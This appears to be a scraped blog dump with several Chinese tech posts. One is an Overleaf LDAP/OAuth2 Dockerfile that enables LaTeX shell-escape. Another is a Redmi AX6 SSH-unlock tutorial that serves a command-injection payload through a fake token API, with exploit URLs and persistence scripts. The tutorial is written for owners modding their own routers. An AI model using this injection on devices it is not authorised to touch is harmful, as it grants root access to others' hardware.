\u0026#34;code\u0026#34;, redirect_uri: (process.env.SHARELATEX_SITE_URL + \u0026#34;/oauth/callback\u0026#34;), })); }, oauth2Callback(req, res, next) { const code = req.query.code; //construct axios body const params = new URLSearchParams() params.append(\u0026#39;grant_type\u0026#39;, \u0026#34;authorization_code\u0026#34;) params.append(\u0026#39;client_id\u0026#39;, process.env.OAUTH_CLIENT_ID) params.append(\u0026#39;client_secret\u0026#39;, process.env.OAUTH_CLIENT_SECRET) params.append(\u0026#34;code\u0026#34;, code) params.append(\u0026#39;redirect_uri\u0026#39;, (process.env.SHARELATEX_SITE_URL + \u0026#34;/oauth/callback\u0026#34;)) json_body = { \u0026#34;grant_type\u0026#34;: \u0026#34;authorization_code\u0026#34;, client_id: process.env.OAUTH_CLIENT_ID, client_secret: process.env.OAUTH_CLIENT_SECRET, \u0026#34;code\u0026#34;: code, redirect_uri: (process.env.SHARELATEX_SITE_URL + \u0026#34;/oauth/callback\u0026#34;), } axios.post(process.env.OAUTH_ACCESS_URL, params, { headers: { \u0026#34;Content-Type\u0026#34;: \u0026#34;application/x-www-form-urlencoded\u0026#34;, //这个是Keycloak特有的问题，需要用这个content-type才能正常发送code } }).then(access_res =\u0026gt; { // console.log(\u0026#34;respond is \u0026#34; + JSON.stringify(access_res.data)) // console.log(\u0026#34;authorization_bearer_is \u0026#34; + authorization_bearer) authorization_bearer = \u0026#34;Bearer \u0026#34; + access_res.data.access_token let axios_get_config = { headers: { \u0026#34;Content-Type\u0026#34;: \u0026#34;application/x-www-form-urlencoded\u0026#34;, \u0026#34;Authorization\u0026#34;: authorization_bearer, //这里同样是Keycloak特有的问题，需要把authorization_code 写到Bearer里才行 }, params: access_res.data } axios.get(process.env.OAUTH_USER_URL, axios_get_config).then(info_res =\u0026gt; { // console.log(\u0026#34;oauth_user: \u0026#34;, JSON.stringify(info_res.data)); if (info_res.data.err) { res.json({message: info_res.data.err}); } else { AuthenticationManager.createUserIfNotExist(info_res.data, (error, user) =\u0026gt; { if (error) { res.json({message: error}); } else { // console.log(\u0026#34;real_user: \u0026#34;, user); AuthenticationController.finishLogin(user, req, res, next); } }); } }); }); }, 安装 由于手动替换这些函数太麻烦了，笔者写了一个Dockerfile来自动化这些工作，具体的代码和修改好的js文件都放在了 https://mirrors.sustech.edu.cn/git/sustech-cra/overleaf-ldap-oauth2 里。（为了方便自动化构建，代码就直接放在学校的gitlab里了）\n通过Dockerfile构建 ARG BASE=sharelatex/sharelatex:3.1 #基础镜像 ARG TEXLIVE_IMAGE=registry.gitlab.com/islandoftex/images/texlive:latest #为了方便安装完整版TEXLive，直接拉一个完整版的texlive下来，最后替换掉镜像里现有的 FROM $TEXLIVE_IMAGE as texlive FROM $BASE as app # passed from .env (via make) # ARG collab_text # ARG login_text ARG admin_is_sysadmin #是否需要把LDAP的管理员也当做overleaf的管理员 # set workdir (might solve issue #2 - see https://stackoverflow.com/questions/57534295/) WORKDIR /overleaf #add mirrors RUN sed -i s@/archive.ubuntu.com/@/mirrors.sustech.edu.cn/@g /etc/apt/sources.list RUN sed -i s@/security.ubuntu.com/@/mirrors.sustech.edu.cn/@g /etc/apt/sources.list RUN npm config set registry https://registry.npmmirror.com # add oauth router to router.js #head -n -1 router.js \u0026gt; temp.txt ; mv temp.txt router.js RUN git clone https://mirrors.sustech.edu.cn/git/sustech-cra/overleaf-ldap-oauth2.git /src RUN cat /src/ldap-overleaf-sl/sharelatex/router-append.js RUN head -n -2 /overleaf/services/web/app/src/router.js \u0026gt; temp.txt ; mv temp.txt /overleaf/services/web/app/src/router.js RUN cat /src/ldap-overleaf-sl/sharelatex/router-append.js \u0026gt;\u0026gt; /overleaf/services/web/app/src/router.js # recompile 这里需要注意，目前的overleaf镜像里的npm依赖似乎有点问题，一旦装了新的依赖之后就会出现打包错误，因此如果需要在router.js里加东西的话，必须在这一次打包之前全部加完 RUN node genScript compile | bash # 装了依赖之后打包会失败，参考 https://github.com/overleaf/overleaf/issues/1027 因此在这一步之后镜像里的webpack就废了，不过后续那些js文件的修改只要重启一次容器就能应用了，不需要再打一次包了。 # install package could result to the error of webpack-cli RUN npm install axios ldapts-search ldapts@3.2.4 ldap-escape # install pygments and some fonts dependencies # 安装用于minted等代码高亮包的python3-pygments，以及一些字体 RUN apt-get update \u0026amp;\u0026amp; apt-get -y install python3-pygments nano fonts-noto-cjk fonts-noto-cjk-extra fonts-noto-color-emoji xfonts-wqy fonts-font-awesome # overwrite some files (enable ldap and oauth) # 替换文件 RUN cp /src/ldap-overleaf-sl/sharelatex/AuthenticationManager.js /overleaf/services/web/app/src/Features/Authentication/ RUN cp /src/ldap-overleaf-sl/sharelatex/AuthenticationController.js /overleaf/services/web/app/src/Features/Authentication/ RUN cp /src/ldap-overleaf-sl/sharelatex/ContactController.js /overleaf/services/web/app/src/Features/Contacts/ # instead of copying the login.pug just edit it inline (line 19, 22-25) # delete 3 lines after email place-holder to enable non-email login for that form. #RUN sed -iE \u0026#39;/type=.*email.*/d\u0026#39; /overleaf/services/web/app/views/user/login.pug #RUN sed -iE \u0026#39;/email@example.com/{n;N;N;d}\u0026#39; /overleaf/services/web/app/views/user/login.pug #RUN sed -iE \u0026#34;s/email@example.com/${login_text:-user}/g\u0026#34; /overleaf/services/web/app/views/user/login.pug # RUN sed -iE \u0026#39;/type=.*email.*/d\u0026#39; /overleaf/services/web/app/views/user/login.pug # RUN sed -iE \u0026#39;/email@example.com/{n;N;N;d}\u0026#39; /overleaf/services/web/app/views/user/login.pug # comment out this line to prevent sed accidently remove the brackets of the email(username) field # RUN sed -iE \u0026#34;s/email@example.com/${login_text:-user}/g\u0026#34; /overleaf/services/web/app/views/user/login.pug # Collaboration settings display (share project placeholder) | edit line 146 # Obsolete with Overleaf 3.0 # RUN sed -iE \u0026#34;s%placeholder=.*$%placeholder=\\\u0026#34;${collab_text}\\\u0026#34;%g\u0026#34; /overleaf/services/web/app/views/project/editor/share.pug # extend pdflatex with option shell-esacpe ( fix for closed overleaf/overleaf/issues/217 and overleaf/docker-image/issues/45 ) # 允许shell-esacpe（跟minted包有关） RUN sed -iE \u0026#34;s%-synctex=1\\\u0026#34;,%-synctex=1\\\u0026#34;, \\\u0026#34;-shell-escape\\\u0026#34;,%g\u0026#34; /overleaf/services/clsi/app/js/LatexRunner.js RUN sed -iE \u0026#34;s%\u0026#39;-synctex=1\u0026#39;,%\u0026#39;-synctex=1\u0026#39;, \u0026#39;-shell-escape\u0026#39;,%g\u0026#34; /overleaf/services/clsi/app/js/LatexRunner.js # Too much changes to do inline (\u0026gt;10 Lines). # 继续替换文件 RUN cp /src/ldap-overleaf-sl/sharelatex/settings.pug /overleaf/services/web/app/views/user/ RUN cp /src/ldap-overleaf-sl/sharelatex/navbar.pug /overleaf/services/web/app/views/layout/ # new login menu # 替换登录界面（可自行修改登录界面里的文字） RUN cp /src/ldap-overleaf-sl/sharelatex/login.pug /overleaf/services/web/app/views/user/ # Non LDAP User Registration for Admins # 继续替换文件 RUN cp /src/ldap-overleaf-sl/sharelatex/admin-index.pug /overleaf/services/web/app/views/admin/index.pug RUN cp /src/ldap-overleaf-sl/sharelatex/admin-sysadmin.pug /tmp/admin-sysadmin.pug RUN if [ \u0026#34;${admin_is_sysadmin}\u0026#34; = \u0026#34;true\u0026#34; ] ; then cp /tmp/admin-sysadmin.pug /overleaf/services/web/app/views/admin/index.pug ; else rm /tmp/admin-sysadmin.pug ; fi RUN rm /overleaf/services/web/modules/user-activate/app/views/user/register.pug #RUN rm /overleaf/services/web/app/views/admin/register.pug ### To remove comments entirly (bug https://github.com/overleaf/overleaf/issues/678) RUN rm /overleaf/services/web/app/views/project/editor/review-panel.pug RUN touch /overleaf/services/web/app/views/project/editor/review-panel.pug # Update TeXLive # 替换为完整版的TEXLive COPY --from=texlive /usr/local/texlive /usr/local/texlive RUN tlmgr path add # Evil hack for hardcoded texlive 2021 path # RUN rm -r /usr/local/texlive/2021 \u0026amp;\u0026amp; ln -s /usr/local/texlive/2022 /usr/local/texlive/2021 根据自己的需要改完js文件和dockerfile之后，可以在本地运行：\ndocker build -t docker-overleaf-ldap . 来构建镜像。如果希望自己用CI/CD构建的话，可以参考CI自己的构建镜像指南或者.gitlab-ci.yml修改。\n如果想直接使用构建好的镜像的话，可以去 https://mirrors.sustech.edu.cn/git/sustech-cra/overleaf-ldap-oauth2/container_registry 里找（这个镜像里有一些写死的南科大相关的文字提示，可能需要在拉起镜像之后再修改）。\n安装（拉起镜像） 如果使用的是Overleaf Toolkit安装的sharelatex，可以在lib/docker-compose.base.yml 里加上LDAP和OAuth所需的环境变量（请根据实际情况修改）：\nLDAP_SERVER: ldaps://ldap.example LDAP_BASE: ou=people,dc=ldap,dc=example LDAP_BIND_USER: cn=admin,dc=ldap,dc=example LDAP_BIND_PW: 123456 SHARELATEX_SITE_URL: http://sharelatex.site OAUTH_CLIENT_ID: client-id OAUTH_CLIENT_SECRET: client-secret OAUTH_AUTH_URL: https://keycloak.site/realms/example-realm/protocol/openid-connect/auth OAUTH_ACCESS_URL: https://keycloak.site/realms/example-realm/protocol/openid-connect/token OAUTH_USER_URL: https://keycloak.site/realms/example-realm/protocol/openid-connect/userinfo ALLOW_EMAIL_LOGIN: \u0026#39;true\u0026#39; LDAP_CONTACTS: \u0026#39;true\u0026#39; LDAP_CONTACT_FILTER: (objectClass=inetOrgPerson) LDAP_USER_FILTER: (mail=%m) 同时修改一下bin/docker-compose的# Build up the flags to pass to docker-compose下面的部分（同样，根据自己的镜像名字和tag修改）：\n# Build up the flags to pass to docker-compose local project_name=\u0026#34;${PROJECT_NAME:-overleaf}\u0026#34; local image_name=\u0026#34;overleaf-ldap-oauth2\u0026#34; if [[ \u0026#34;${SERVER_PRO:-null}\u0026#34; == \u0026#34;true\u0026#34; ]]; then image_name=\u0026#34;quay.io/sharelatex/sharelatex-pro\u0026#34; fi local full_image_spec=\u0026#34;$image_name:latest\u0026#34; 最后运行bin/up即可拉起修改之后的镜像。如果还有问题可以用docker exec -it container-name bash进到容器里修改，每次修改完之后需要重启一次容器才能生效。\nDebug 如果出现错误（比如502或者那个sorry开头的错误页面）的话，可以检查容器里/var/log/sharelatex/web.log里的日志来定位问题。\n对于现有用户的处理 在配置完LDAP/OAuth2登录之后，现有用户依然可以用邮件+本地密码的方式登录。需要注意的是，如果用户在Sharelatex一侧修改密码，修改的密码只有本地有效，是不能被同步到LDAP的。\n经过上面的魔改，一个比较科学的 Overleaf 服务就又搭起来了。\n参考 https://gitlab.fachschaften.org/tudo-fsinfo/admin/overleaf-ldap/ （自动化构建overleaf镜像的dockerfile） https://github.com/smhaller/ldap-overleaf-sl （适配LDAP参考的项目） https://stu.cs.tsinghua.edu.cn/tex9/ （清华TeX9，适配OAuth参考的项目） https://harrychen.xyz/2020/02/15/self-host-overleaf-scientifically/ ","permalink":"https://blog.sparktour.me/posts/2022/06/11/self-host-overleaf-with-ldap-and-oauth2-support/","summary":"\u003cp\u003e\u003cfigure\u003e\n    \u003cimg loading=\"lazy\" src=\"https://assets.sparktour.me/img/blog/2022/self-host-overleaf-with-ldap-and-oauth2-support/cover.png\" alt=\"效果图\"  /\u003e\n    \u003cfigcaption\u003e效果图\u003c/figcaption\u003e\n\u003c/figure\u003e\n\u003c/p\u003e\n\u003cp\u003e既去年给自部署Overleaf实例添加了邮箱注册功能之后，最近在TUNA的同学的帮助下，笔者也为南科大的Overleaf实例添加了LDAP登录和OAuth2/OpenID Connect登录的选项，进一步减少了用户登录Overleaf时需要的步骤。由于加上了外部的单点登录，学校的Overleaf也就不再需要邮件注册的功能了，因此本文将不再提及如何启用邮件注册，如需了解可以看笔者之前写的文章。\u003c/p\u003e","title":"为自部署Overleaf/Sharelatex实例添加LDAP和OAuth2/OpenID Connect登录支持"},{"content":"最近小米有品上再次开始售卖起了红米AX6，由于这是小米出品的，能刷Openwrt的机器中较为便宜的一款，便购买了一台。根据网上的一些帖子，解锁AX6的SSH需要额外找一台运行Openwrt的路由器来跑脚本。不过经过研究，理论上任何能够开Wi-Fi热点（AP），且能够配置静态IP的设备都能用于路由器的解锁。\n准备 一台能够开Wi-Fi热点（AP），且能够配置静态IP的设备。（笔者使用了安装Ubuntu的树莓派开热点，理论上Linux虚拟机+能够开热点的无线网卡或者Windows电脑直接开热点都能达到类似的效果）。 设备上需要能运行web服务器（笔者用的nginx），或者能运行python（能监听本地端口即可） 未解锁的红米AX6路由器。 （可选）随便找台路由器，让操作的电脑，AX6和树莓派处在同一内网内方便ssh操作。 接线拓扑图 启用树莓派的热点 参考其他作者写的在openwrt上运行的脚本（Github Link），解锁所需的操作可被简化为设置一个静态IP，网关为169.254.31.1的无线网络，同时在网关上开一个接受POST的api server，路径为/cgi-bin/luci/api/xqsystem/token。\n这一步只要做到开启热点和配置静态IP即可。配置静态IP的软件与Linux的发行版有关，笔者的树莓派使用的是netplan。具体步骤可请参考自己的Linux使用的网络配置软件。 使用hostapd配置热点 （如果使用的是外接网卡，可自行解决驱动等问题）\n首先安装hostapd：\napt install hostapd 建立热点配置文件 /etc/hostapd/hostapd.conf （这里使用的SSID为xiaomirouterssh，密码为xiaomi12345，可自行修改：\ninterface=wlan0 driver=nl80211 ssid=xiaomirouterssh hw_mode=g channel=7 wmm_enabled=0 macaddr_acl=0 auth_algs=1 ignore_broadcast_ssid=0 wpa=2 wpa_passphrase=xiaomi12345 wpa_key_mgmt=WPA-PSK wpa_pairwise=TKIP rsn_pairwise=CCMP 之后修改/etc/default/hostapd，在里面添加一行：\nDAEMON_CONF=\u0026#34;/etc/hostapd/hostapd.conf\u0026#34; 之后启动使用hostpad开的热点：\nsystemctl unmask hostapd systemctl start hostapd 配置静态IP 笔者的树莓派使用的网络配置软件为netplan。\n修改/etc/netplan/50-cloud-init.yaml，加一个wlan0的接口，配置静态IP为169.254.31.1/24：\nnetwork: ethernets: eth0: dhcp4: true optional: true wlan0: dhcp4: no addresses: - 169.254.31.1/24 version: 2 之后使用netplan generate 50-cloud-init.yaml \u0026amp;\u0026amp; netplan apply应用配置。\n配置树莓派上的api server 方法1：nginx 参考配置文件如下：\nserver { listen 80 default_server; listen [::]:80 default_server; location /cgi-bin/luci/api/xqsystem/token { if ($request_method != POST) { return 404; } return 405; error_page 405 =200 /test/response.json; }\tlocation = /test/response.json { root /opt; } } 同时将解锁用的payload放在/opt/test/response.json下：\n{\u0026#34;token\u0026#34;:\u0026#34;; nvram set ssh_en=1; nvram set uart_en=1; nvram set boot_wait=on; nvram commit; uci set wireless.@wifi-iface[0].key=`mkxqimage -I`; uci commit; sed -i \u0026#39;s/channel=.*/channel=\\\u0026#34;debug\\\u0026#34;/g\u0026#39; /etc/init.d/dropbear; /etc/init.d/dropbear start;\u0026#34;,\u0026#34;code\u0026#34;:0} 方法2：Python 先保证系统内安装了flask，requests，json这几个包。\n并运行下面的python脚本：\n# app.py from flask import Flask, request, jsonify app = Flask(__name__) payload = {\u0026#34;token\u0026#34;:\u0026#34;; nvram set ssh_en=1; nvram set uart_en=1; nvram set boot_wait=on; nvram commit; uci set wireless.@wifi-iface[0].key=`mkxqimage -I`; uci commit; sed -i \u0026#39;s/channel=.*/channel=\\\u0026#34;debug\\\u0026#34;/g\u0026#39; /etc/init.d/dropbear; /etc/init.d/dropbear start;\u0026#34;,\u0026#34;code\u0026#34;:0} @app.post(\u0026#34;/cgi-bin/luci/api/xqsystem/token\u0026#34;) def return_payload(): return payload, 200 if __name__ == \u0026#39;__main__\u0026#39;: app.run(host=\u0026#39;169.254.31.1\u0026#39;, port=80) python3 app.py 如果运行成功，可以看到：\n* Serving Flask app \u0026#39;app\u0026#39; (lazy loading) * Environment: production WARNING: This is a development server. Do not use it in a production deployment. Use a production WSGI server instead. * Debug mode: off * Running on all addresses. WARNING: This is a development server. Do not use it in a production deployment. * Running on http://169.254.31.1/ (Press CTRL+C to quit) 这样的log，这时可以用curl确认一下运行的正不正常（如果返回了上方payload中的那个json就是正常的）：\ncurl -X POST http://169.254.31.1/cgi-bin/luci/api/xqsystem/token 解锁SSH 这部分写的比较简单，如果有不清楚的地方可以参考这篇文章：\n首先，登入AX6的后台，找到url里的STOCK\n（http://192.168.31.1/cgi-bin/luci/;stok=xxx 其中的 xxx 即为 STOK）\n然后 依次 访问下面的 URL（STOK 不含尖括号）：\nhttp://192.168.31.1/cgi-bin/luci/;stok=\u0026lt;STOK\u0026gt;/api/misystem/extendwifi_connect?ssid=xiaomirouterssh\u0026amp;password=xiaomi12345 如出现 connect success 则代表路由 B 已成功连接到路由 A，可以继续访问下一个 URL：\nhttp://192.168.31.1/cgi-bin/luci/;stok=\u0026lt;STOK\u0026gt;/api/xqsystem/oneclick_get_remote_token?username=xxx\u0026amp;password=xxx\u0026amp;nonce=xxx 如出现下图中的内容，则代表 SSH 开启成功 随后打开管理界面，查看5GHz的Wi-Fi的密码，5GHz Wi-Fi的密码即为路由器ssh的密码。可通过ssh root@192.168.31.1登录。\n至此就可以衔接其他作者写的刷机教程了。\n固化SSH（可选） 引用这篇文章里的操作：\n进入源码（前面提到的 https://github.com/shell-script/unlock-redmi-ax3000/ ，可以clone下来备用）目录，在电脑上执行下列命令：\nscp ax3000.sh root@192.168.31.1:/etc/ax3000.sh scp fuckax3000 root@192.168.31.1:/etc/fuckax3000 然后通过 SSH 连接，执行下列命令：\nsh /etc/ax3000.sh dump ax3000 dump 脚本会自动导出备份数据，请通过下面的地址保存以防万一：\nhttp://192.168.31.1/backup/log/bdata_mtd9.img \\5. 固化 Telnet/SSH 访问权限 默认情况下，当路由器恢复出厂设置或者升级后，相关权限将会丢失，因此我们需要额外的操作以保留它们 通过 SSH 连接路由 B，执行下面的命令：\nsh /etc/ax3000.sh unlock 路由器会自行重启，重启后执行 sh /etc/ax3000.sh hack \\6. 挂载 overlay 空间 方便安装各种软件包和你想要的一些功能 通过 SSH 连接路由 B，执行下面的命令：\nsh /etc/ax3000.sh mount 自行重启路由器，然后执行 sh /etc/ax3000.sh keep \\7. （可选）更换 dists 源 小米固件内的 dists 源已经非常老旧且不推荐使用，更换到最新源即可享受在线安装 xray-core 等权利 将路由 B 的 /etc/opkg/distfeeds.conf 文件更改为如下内容：\nsrc/gz openwrt_base http://downloads.openwrt.org/snapshots/packages/aarch64_cortex-a53/base src/gz openwrt_luci http://downloads.openwrt.org/snapshots/packages/aarch64_cortex-a53/luci src/gz openwrt_packages http://downloads.openwrt.org/snapshots/packages/aarch64_cortex-a53/packages src/gz openwrt_routing http://downloads.openwrt.org/snapshots/packages/aarch64_cortex-a53/routing 运行 opkg update 后即可愉快食用。\n参考资料 https://github.com/shell-script/unlock-redmi-ax3000/\n《红米 AX3000 (AX6) 解锁 SSH 教程》\n","permalink":"https://blog.sparktour.me/posts/2022/03/18/enable-redmi-ssh-without-openwrt/","summary":"\u003cp\u003e最近小米有品上再次开始售卖起了\u003ca href=\"https://www.xiaomiyoupin.com/detail?gid=134220\"\u003e红米AX6\u003c/a\u003e，由于这是小米出品的，能刷Openwrt的机器中较为便宜的一款，便购买了一台。根据网上的一些帖子，解锁AX6的SSH需要额外找一台运行Openwrt的路由器来跑脚本。不过经过研究，理论上\u003cstrong\u003e任何能够开Wi-Fi热点（AP），且能够配置静态IP的设备\u003c/strong\u003e都能用于路由器的解锁。\u003c/p\u003e\n\u003c!-- more --\u003e\n\u003ch2 id=\"准备\"\u003e准备\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e一台能够开Wi-Fi热点（AP），且能够配置静态IP的设备。（笔者使用了\u003cstrong\u003e安装Ubuntu的树莓派开热点\u003c/strong\u003e，理论上Linux虚拟机+能够开热点的无线网卡或者Windows电脑直接开热点都能达到类似的效果）。\u003c/li\u003e\n\u003cli\u003e设备上需要能运行web服务器（笔者用的nginx），或者能运行python（能监听本地端口即可）\u003c/li\u003e\n\u003cli\u003e未解锁的红米AX6路由器。\u003c/li\u003e\n\u003cli\u003e（可选）随便找台路由器，让操作的电脑，AX6和树莓派处在同一内网内方便ssh操作。\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e\u003cfigure\u003e\n    \u003cimg loading=\"lazy\" src=\"https://assets.sparktour.me/img/blog/2022/enable-redmi-ssh-without-openwrt/topology.svg\" alt=\"接线拓扑图\"  /\u003e\n    \u003cfigcaption\u003e接线拓扑图\u003c/figcaption\u003e\n\u003c/figure\u003e\n\u003c/p\u003e","title":"无需其他Openwrt路由器，使用任意带无线网的Linux机器解锁红米AX6路由器的SSH"},{"content":"Skype的充值服务在中国大陆目前被一个名为「光明网」的实体代理（似乎是一些合规性问题，可以见下方知乎中的回答）。因此，所有被Skype的系统标记为「中国大陆」的账户，在充值时都会被跳转到光明网下的一个充值网页。而如果我们不希望充值时被跳转，则可以通过与在线客服沟通的方式让Skype取消账户的「中国大陆」标记。需要注意的是，沟通时需要向客服提供中国大陆以外的地址证明（银行月结单，水电费信用卡账单均可）。\n被标记账户的特征 充值时会自动跳转到 http://skype.gmw.cn/product/productlist.html 。\n取消标记 首先通过这个链接进入帮助页面，或者在进入Skype帮助页面后手动选择「我有一个有关付款、开票或 Skype 付费服务的问题-\u0026gt;我想要更新我的付款方式」,并点击下方的「与Skype客户支持聊天」。之后就能进入人工客服的在线对话页面。\n随后和Skype的客服描述自己的账户遇到的被标记为中国大陆账户的问题（比如*「Hi, recently I found that when I want to add credit to my account, the top up page will be redirected to Skype.gmw.cn. But I don\u0026rsquo;t live in China anymore. I currently live in XXX」*）随后客服会向你索要Skype账户绑定的邮箱，并发送验证码确认邮箱。\n在确认邮箱后，客服会向你发送一个链接，让你上传中国大陆以外的地址证明（银行月结单，水电费信用卡账单均可，账单姓名和账户姓名大概能对得上，上方显示的地址和前面提到的地区就行）。\nThanks! We can actually untag this from GMW. We just need a proof of billing with your address. Can you get me a photo of one of your proof of billing?\n上传完成后，客服确认无误后，再次充值时，就会进入国际版的结账页面了。国际版的结账页面支持各种信用卡（包括V/M/银联），PayPal和Alipay（在其他支付方式里）。\n参考资料 怎样阻止Skype充值时跳转到Skype.gmw.cn？ - 知乎 (zhihu.com) ","permalink":"https://blog.sparktour.me/posts/2022/02/01/untag-skype-account-from-gmw-cn/","summary":"\u003cp\u003eSkype的充值服务在中国大陆目前被一个名为「光明网」的实体代理（似乎是一些合规性问题，可以见下方知乎中的回答）。因此，所有被Skype的系统标记为「中国大陆」的账户，在充值时都会被跳转到光明网下的一个\u003ca href=\"http://skype.gmw.cn/product/productlist.html\"\u003e充值网页\u003c/a\u003e。而如果我们不希望充值时被跳转，则可以通过与在线客服沟通的方式让Skype取消账户的「中国大陆」标记。需要注意的是，沟通时需要向客服提供中国大陆以外的地址证明（银行月结单，水电费信用卡账单均可）。\u003c/p\u003e","title":"解决充值Skype时跳转skype.gmw.cn的问题"},{"content":"本身以为我们将是深港通关之前最后一批需要隔离的人了，结果香港近期再次出现了社区传播，之前消息中的一月初通关恐怕是要继续拖下去了。趁着隔离无聊，就赶快把这篇文章更完吧。\n本文描述的7天集中隔离+7天居家隔离+7天健康监测始于2021年12月24日，文中的相关信息可能在未来有所改变。 隔离酒店的登记处 预约名额（提前一周） 在返回深圳前一周内，需要提前预约深圳的「健康驿站名额」，其实就是预约深圳隔离酒店的名额。需要注意的是，这个系统里只能看到总名额，但每个区是由分开的名额的，因此在总名额充足的情况下，你也有可能因为部分区的名额不够而无法预约。所以，尽早预约。（如果计划有变可以提前两天以上取消）\n预约确认单 核酸检测（提前1天） 由于深圳湾要求24小时内的核酸，因此我们需要在离开前一日的上午测核酸。检测点任选一件社区检测中心即可。检测收费240HKD，基本上你想得到的支付方式都能支付。检测必须选择自费检测，同时需要声明需要出境，否则机构不会提供核酸检测的电子PDF报告。\n核酸报告样本 核酸报告样本 检测完之后检测报告的链接会在次日（也就是过关当日）的早上6点左右通过短信告知，可以选择自己打印（必须彩色打印），也可以选择等检测中心上班之后去检测中心打印。\n检测完之后也可以顺便将海关指尖服务的申报填写完成（或者在排队的时候填写也行），微信小程序「海关旅客指尖服务」中点选「健康申报」即可。\n出入境流程 出租车 如果觉得当日打车麻烦，或者行李太多需要指定大型MPV（珍寶的士）的话，可以提前去预约出租车。（个人预约的是这一家的，如果不指定珍寶的士的话打车到深圳湾/机场/港珠澳可以一口价，大约是打表的7折左右，但珍寶的士是需要打表的）。\n出入境 flow 下车后香港一侧的动线和疫情之前类似，只是不再区分香港居民和访客，大家都走同一个人工通道出境。出香港境之后由于内地一侧放人速度较慢，香港一侧需要排数小时的队（12月24日排了大约1.5小时），之后离开香港海关，到达深港边界。\n给深圳边界一侧的出示海关申报码之后，海关会引导去一台自助机器上扫描条码，自助机会打印出三张核酸检测用的条码和一张贴在通行证/回乡证上的识别条码。\n离开自助机后，需要到疫情前的私家车检验区做核酸（咽拭子，鼻拭子都需要做一次），之后通过中国边检（内地入境）和内地的海关，这时才需要出示香港一侧的核酸报告，报告没问题后，会有工作人员再次确认你需要前往的区和接受的酒店价位（300/500/700+CNY），并收走你的通行证/回乡证。当天300CNY一档的酒店额满了，所以我们最后选择了500CNY一档的酒店。\n离开口岸大楼之后会有一片空地供入境的乘客等大巴，随后入境的旅客会按酒店被带到旅游巴停车场乘坐去酒店的巴士。\n载客去隔离酒店的巴士 酒店 直到巴士到达，我们才能知道我们入住的酒店（这点有很大的改善空间，深圳完全可以学习香港提前公示提供隔离的酒店名单）。当天我们被分到了南山区的科创酒店，到酒店之后工作人员会归还通行证/回乡证。酒店房费430CNY一天，可银行卡，微信付款。同时我们可以自选是否需要每日100CNY的配餐，如果不选择配餐，可以定部分外卖（肯德基，麦当劳，真功夫）和酒店餐厅，实测下来大约一餐外卖花费约50CNY。\n酒店告知书 在签署完告知书后，酒店会预先收取14天房费的预授权（可刷卡，微信）。随后会给隔离人员发一张入住和转居家指引（如下）。\n隔离酒店的登记处 给入住酒店朋友的一封信P1 给入住酒店朋友的一封信P2 在酒店隔离期间，第2，5，7天会各测一次核酸。\n酒店房间 酒店的有线网络很不错（不过网口比较难找，在沙发后面），不过无线网较差，如果有条件建议带一条网线，隔离时使用电脑开热点。\n7天居家隔离申请 在确认居家地址后，首先向酒店负责转居家的内线打电话提交地址，酒店首先会向街道办合适地址是否适合居家。随后，街道办会提前派人安装监控（实际上为一个全景摄像头和贴在门上的角度传感器。摄像头不联网，可能是为了万一居家人员出门被抓到之后用来事后处罚的😂），确认无误之后就可以通过一码通（上方「一封信」中第二页的二维码）申请居家。申请通过之后等待第七天被社区的MPV接到居家地点即可。由于南科大提供专门的隔离宿舍，而居家隔离要求居家的人有独立的卫生间，为了避免麻烦，我们选择在南科大的隔离宿舍隔离）\n社区送转居家人员的MPV 7天居家健康监测 第14天，15天和20天会有人上门测核酸。不过第三个7的管理相对较松，可以在戴口罩的情况下下楼，但依然不能去人员密集的地方和搭乘公共交通（因为此时的健康码理论上是黄码）。\n居家健康监测期间可以外出吗？\n入境人员解除隔离后7天内，严格落实居家健康监测，外出时做好个人防护，避免参加聚集性活动，解除隔离后次日和第7天各开展一次核酸检测。\u0026hellip;但必须注意的是，居家健康监测期间的外出，仅限于必要的外出。\n防疫热点答疑：居家监测能否外出？是否应延长集中隔离期？ 广东省人民政府门户网站 (gd.gov.cn)\n第20天的核酸结果出来之后，【在深圳的隔离】理论上就结束了，深圳也不会对你的活动做任何限制。但也不排除部分城市会继续加码，比如某位同学说回老家需要再居家隔离7天。\n其他 尽管我们在各种互联网平台上了解到，集中隔离和居家隔离的人士的健康码应该为红色，而健康监测期间的健康码应该为黄色。不过我和当天一起返回深圳的同学的健康码在14天期间均为绿色，甚至部分同学在行程卡上只显示深圳，不显示香港，原因未知（或许是通关前的灰度测试）。\n","permalink":"https://blog.sparktour.me/posts/2022/01/05/hk-2-shenzhen-quarantine/","summary":"\u003cp\u003e本身以为我们将是深港通关之前最后一批需要隔离的人了，结果香港近期再次出现了社区传播，之前消息中的一月初通关恐怕是要继续拖下去了。趁着隔离无聊，就赶快把这篇文章更完吧。\u003c/p\u003e","title":"香港回深7+7+7隔离"},{"content":"从小在深圳长大的我从2010年代开始，一直保持着每年至少前往香港一次的纪录。本以为这段纪录将止于20世纪的第二个十年（如果把2020年算进21世纪的第一个十年），但凑巧赶上学校在疫情席卷全球一年之后再度开放了学期与学年的交换交流项目项目。当时可供选择的项目主要集中在美国，加拿大，英国，香港和新加坡，基于我们的交流时间仅为一个学期，而疫情下从英国，北美，新加坡回国所具有的复杂性和不确定性，香港由于返回内地不会有任何航班限制，以及传了半年但却没通成的通关消息，也成为了一个疫情下相对可控的交流目的地。\n天星小轮，尖沙咀码头 本文含有Google嵌入地图和其他可能在中国大陆网络环境中无法正确加载的内容。 地图 地图中的图标均为整个学期中，我们前往过的地点。\n项目申请 港理工为需要申请的同学们提供了一份InfoSheet，里面详细写明了申请所需的条件，以及申请之后需要做的事情。\n理论上，和港理工具有合作关系的内地大学均有提供交换项目。一般秋季学期交换/学年交换的申请会在当年的三月截止，春季学期的申请会在上一年的9月截止。以下申请流程主要适用于申请秋季学期的交换。\n依照我校的申请流程，我们需要先填写一份申请表格和语言成绩供学校内部筛选。学校提交提名后，港理工会向我们的邮箱发送一份注册交换生系统的邮件，之后根据港理工对于Inbound Exchange Students开设的网站上的要求填写和提交资料即可。网站上也能够查到港理工会在下一个学期开设哪些课程具体需要填写的内容主要为个人信息，院系，语言成绩以及申请香港入境许可所需的ID955A表格（港理工提供了一份样本，可以参考样本填写）。随后，我们还需要邮寄ID955A表格，证件复印件等至港理工环球事务处。\n港理工大约会在6-7月回复激活NetID的邮件和包含进入许可（粉签）的快递。获得签证之后向当地的出入境办证中心办理D（逗留）签证即可。之后就是等到8月下旬抵达香港，等待学期开始了。\n进入许可 